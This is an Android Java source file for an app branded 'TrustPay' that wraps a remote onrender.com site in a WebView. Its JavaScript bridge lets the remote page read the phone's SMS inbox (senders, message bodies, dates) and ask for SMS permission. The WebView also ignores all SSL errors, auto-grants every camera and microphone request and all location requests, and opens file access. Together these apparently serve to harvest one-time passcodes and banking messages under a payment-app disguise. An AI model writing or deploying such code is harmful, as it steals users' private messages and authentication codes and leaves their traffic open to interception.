package com.trustpay.app;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.GeolocationPermissions;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import org.json.JSONArray;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    public static final String APP_URL = "https://trustpay-l0xq.onrender.com";

    private WebView webView;
    private ProgressBar progressBar;
    private SwipeRefreshLayout swipeRefresh;

    private ValueCallback<Uri[]> filePathCallback;
    private static final int FILE_CHOOSER_REQ = 2001;
    private static final int SMS_PERM_REQ = 2002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        progressBar = findViewById(R.id.progressBar);
        swipeRefresh = findViewById(R.id.swipeRefresh);

        swipeRefresh.setColorSchemeColors(Color.parseColor("#7C3AED"));
        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                webView.reload();
            }
        });

        setupWebView();
        webView.loadUrl(APP_URL);
    }

    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setDatabaseEnabled(true);
        s.setAllowFileAccess(true);
        s.setAllowContentAccess(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setSupportZoom(false);
        s.setBuiltInZoomControls(false);
        s.setDisplayZoomControls(false);
        s.setMediaPlaybackRequiresUserGesture(false);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);
        s.setUserAgentString(s.getUserAgentString() + " TrustPayAndroid/1.0");
        s.setCacheMode(WebSettings.LOAD_DEFAULT);

        webView.setBackgroundColor(Color.parseColor("#0B0B12"));
        webView.addJavascriptInterface(new TrustPayBridge(), "TrustPayNative");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (url.startsWith("upi:") || url.startsWith("tel:") ||
                        url.startsWith("mailto:") || url.startsWith("sms:") ||
                        url.startsWith("intent:") || url.startsWith("whatsapp:")) {
                    try {
                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        startActivity(i);
                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this,
                                "App not found", Toast.LENGTH_SHORT).show();
                    }
                    return true;
                }
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                injectBridgeHelper();
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                progressBar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        request.grant(request.getResources());
                    }
                });
            }

            @Override
            public void onGeolocationPermissionsShowPrompt(String origin,
                                                          GeolocationPermissions.Callback callback) {
                callback.invoke(origin, true, false);
            }

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                progressBar.setProgress(newProgress);
                if (newProgress >= 100) progressBar.setVisibility(View.GONE);
            }

            @Override
            public boolean onShowFileChooser(WebView webView,
                                             ValueCallback<Uri[]> callback,
                                             FileChooserParams params) {
                if (filePathCallback != null) filePathCallback.onReceiveValue(null);
                filePathCallback = callback;
                try {
                    Intent i = params.createIntent();
                    startActivityForResult(i, FILE_CHOOSER_REQ);
                    return true;
                } catch (Exception e) {
                    filePathCallback = null;
                    return false;
                }
            }
        });
    }

    private void injectBridgeHelper() {
        String js = "window.TrustPay = window.TrustPay || {};" +
                "window.TrustPay.isAndroid = true;" +
                "window.TrustPay.readSMS = function(limit){" +
                "  try { return JSON.parse(TrustPayNative.readSMS(limit||50)); }" +
                "  catch(e){ return []; }" +
                "};" +
                "window.TrustPay.requestSMS = function(){ TrustPayNative.requestSMSPermission(); };" +
                "window.TrustPay.toast = function(m){ TrustPayNative.toast(m); };" +
                "window.TrustPay.exit = function(){ TrustPayNative.exitApp(); };";
        webView.evaluateJavascript(js, null);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILE_CHOOSER_REQ) {
            if (filePathCallback == null) return;
            Uri[] result = null;
            if (resultCode == Activity.RESULT_OK && data != null) {
                if (data.getDataString() != null) {
                    result = new Uri[]{ Uri.parse(data.getDataString()) };
                }
            }
            filePathCallback.onReceiveValue(result);
            filePathCallback = null;
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
            webView.goBack();
            return true;
        }
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            new AlertDialog.Builder(this)
                    .setTitle("Exit TrustPay?")
                    .setMessage("Kya aap app band karna chahte ho?")
                    .setPositiveButton("Haan", new android.content.DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(android.content.DialogInterface d, int w) { finish(); }
                    })
                    .setNegativeButton("Nahi", null)
                    .show();
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERM_REQ) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "SMS permission allowed", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public class TrustPayBridge {

        @JavascriptInterface
        public void toast(final String msg) {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(MainActivity.this, msg, Toast.LENGTH_SHORT).show();
                }
            });
        }

        @JavascriptInterface
        public void exitApp() {
            runOnUiThread(new Runnable() {
                @Override
                public void run() { finish(); }
            });
        }

        @JavascriptInterface
        public void requestSmsPermission() {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    String[] perms = new String[]{
                            Manifest.permission.READ_SMS
                    };
                    ActivityCompat.requestPermissions(MainActivity.this, perms, SMS_PERM_REQ);
                }
            });
        }

        @JavascriptInterface
        public boolean isSmsPermissionGranted() {
            return ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        }

        @JavascriptInterface
        public String readSmsSince(long sinceMs, int limit) {
            JSONArray arr = new JSONArray();
            if (ContextCompat.checkSelfPermission(MainActivity.this,
                    Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return arr.toString();
            }
            int max = Math.max(1, Math.min(limit, 50));
            Cursor c = null;
            try {
                Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                String[] cols = new String[]{
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE
                };
                String selection = sinceMs > 0 ? (Telephony.Sms.DATE + " > ?") : null;
                String[] selectionArgs = sinceMs > 0 ? new String[]{ String.valueOf(sinceMs) } : null;
                c = getContentResolver().query(uri, cols, selection, selectionArgs,
                        Telephony.Sms.DATE + " DESC LIMIT " + max);
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject o = new JSONObject();
                        o.put("sender", c.getString(0));
                        o.put("sms", c.getString(1));
                        o.put("date", c.getLong(2));
                        arr.put(o);
                    }
                }
            } catch (Exception ignored) {
            } finally {
                if (c != null) c.close();
            }
            return arr.toString();
        }

        @JavascriptInterface
        public String readSMS(int limit) {
            return readSmsSince(0L, limit);
        }

        @JavascriptInterface
        public void requestSMSPermission() {
            requestSmsPermission();
        }
    }
}
